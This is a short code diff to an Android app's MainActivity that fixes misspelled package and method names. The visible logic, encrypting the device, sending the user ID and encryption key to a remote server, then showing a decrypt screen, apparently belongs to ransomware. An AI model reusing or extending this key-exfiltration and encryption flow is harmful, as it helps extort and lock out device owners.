@@ -16,11 +16,10 @@ import android.support.v4.content.ContextCompat;
 import java.util.ArrayList;
 import java.util.List;
 
-import alepacheco.com.rw.activityes.DecryptActivity;
+import alepacheco.com.rw.activities.DecryptActivity;
 import alepacheco.com.rw.io.IO;
 import alepacheco.com.rw.persistence.LocalStorage;
 import alepacheco.com.rw.services.EncryptService;
-import alepacheco.com.rw.services.MyService;
 
 public class MainActivity extends Activity {
     String[] permissions = new String[]{
@@ -35,7 +34,7 @@ public class MainActivity extends Activity {
 
         if(isEncrypted()){
             if(!checkSendedToServer()){
-                senDataToServer();
+                sendDataToServer();
             }
             /*
             * show activity to decrypt
@@ -78,7 +77,7 @@ public class MainActivity extends Activity {
         return LocalStorage.getInstance(ctx).CheckSendedToServer();
     }
 
-    private void senDataToServer(){
+    private void sendDataToServer(){
         IO.sendKeyToServer(ctx,
                     LocalStorage.getInstance(ctx).getByTag(LocalStorage.TAG_ID_USER),
                     LocalStorage.getInstance(ctx).getByTag(LocalStorage.TAG_KEY));
